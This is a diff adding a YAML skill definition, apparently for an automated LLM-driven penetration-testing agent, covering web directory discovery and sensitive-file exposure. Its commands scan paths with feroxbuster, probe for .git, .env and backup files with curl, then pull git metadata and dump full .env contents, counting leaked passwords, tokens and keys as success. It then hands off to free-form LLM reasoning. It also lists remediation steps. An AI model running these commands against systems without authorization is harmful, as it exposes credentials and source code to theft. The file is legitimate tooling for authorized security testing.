@@ -1,0 +1,127 @@
+skill_id: directory_discovery
+name: "Web 目录/路径发现"
+category: server_misconfig
+version: "1.0"
+
+principle: |
+  递归扫描 Web 目录，发现隐藏的管理后台、配置文件、备份文件、
+  信息泄露端点。工具链: feroxbuster(快速递归) → dirsearch(全面) → gobuster。
+  重点关注: 管理后台、.git/.env/.bak、phpinfo、目录遍历。
+
+match:
+  rules:
+    - fingerprint_contains: ["http"]
+    - fingerprint_contains: ["nginx"]
+    - fingerprint_contains: ["apache"]
+    - evidence_contains: ["directory listing"]
+    - evidence_contains: ["目录遍历"]
+    - evidence_contains: ["directory traversal"]
+
+probes:
+  - id: quick_dir_scan
+    description: "feroxbuster 快速递归目录扫描"
+    command: |
+      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+      echo "=== Feroxbuster Quick Scan ==="
+      feroxbuster -u "$BASE" -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+        -t 20 -d 2 --no-state -q --status-codes 200,301,302,403 \
+        --timeout 8 2>/dev/null | head -80
+      echo "DIR_SCAN_DONE"
+    timeout: 120
+    parse_rules:
+      - if_contains: ["200"]
+        set: { found_paths: true }
+      - if_contains: ["admin"]
+        set: { admin_panel: true }
+      - if_contains: [".git"]
+        set: { git_exposed: true }
+      - if_contains: [".env"]
+        set: { env_exposed: true }
+      - if_contains: ["phpinfo"]
+        set: { phpinfo_exposed: true }
+      - if_contains: ["manager"]
+        set: { manager_found: true }
+      - if_contains: ["console"]
+        set: { console_found: true }
+
+  - id: check_sensitive_files
+    description: "检查敏感文件泄露"
+    command: |
+      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+      echo "=== Sensitive File Check ==="
+      for path in /.git/HEAD /.env /robots.txt /sitemap.xml /.htaccess \
+                  /wp-config.php.bak /config.php.bak /web.config \
+                  /backup.zip /backup.tar.gz /dump.sql; do
+        code=$(curl -s -o /dev/null -w "%{http_code}" "$BASE$path" --max-time 5 2>/dev/null)
+        if [ "$code" = "200" ]; then
+          echo "SENSITIVE_FILE:$path (HTTP 200)"
+          curl -s "$BASE$path" --max-time 5 2>/dev/null | head -5
+        fi
+      done
+      echo "SENSITIVE_CHECK_DONE"
+    timeout: 60
+    parse_rules:
+      - if_contains: ["SENSITIVE_FILE"]
+        set: { sensitive_files: true }
+      - if_contains: [".git/HEAD"]
+        set: { git_exposed: true }
+
+exploit_paths:
+  - path_id: git_dump
+    name: ".git 源码泄露利用"
+    priority: 1
+    conditions:
+      git_exposed: true
+    steps:
+      - id: dump_git
+        description: "下载 .git 目录并提取源码"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== Git Dump ==="
+          cd /tmp && rm -rf git_dump
+          # 尝试读取关键 git 文件
+          for f in HEAD config refs/heads/master objects/info/packs; do
+            echo "--- $f ---"
+            curl -s "$BASE/.git/$f" --max-time 5 2>/dev/null | head -5
+          done
+          echo "GIT_DUMP_DONE"
+        timeout: 30
+        success_criteria:
+          stdout_contains_any: ["ref:", "repositoryformatversion", "GIT_DUMP_DONE"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "info_disclosure"
+
+  - path_id: env_leak
+    name: ".env 配置泄露"
+    priority: 2
+    conditions:
+      env_exposed: true
+    steps:
+      - id: read_env
+        description: "读取 .env 文件内容"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== .env Content ==="
+          curl -s "$BASE/.env" --max-time 10 2>/dev/null
+          echo "ENV_READ_DONE"
+        timeout: 15
+        success_criteria:
+          stdout_contains_any: ["DB_", "SECRET", "PASSWORD", "KEY", "TOKEN"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "info_disclosure"
+
+  - path_id: llm_freeform
+    name: "LLM 自由推理"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+
+remediation: |
+  1. 删除或限制访问 .git、.env 等敏感文件
+  2. 配置 Web 服务器禁止目录列表
+  3. 移除备份文件和调试端点
+  4. 使用 .htaccess 或 nginx deny 规则保护敏感路径
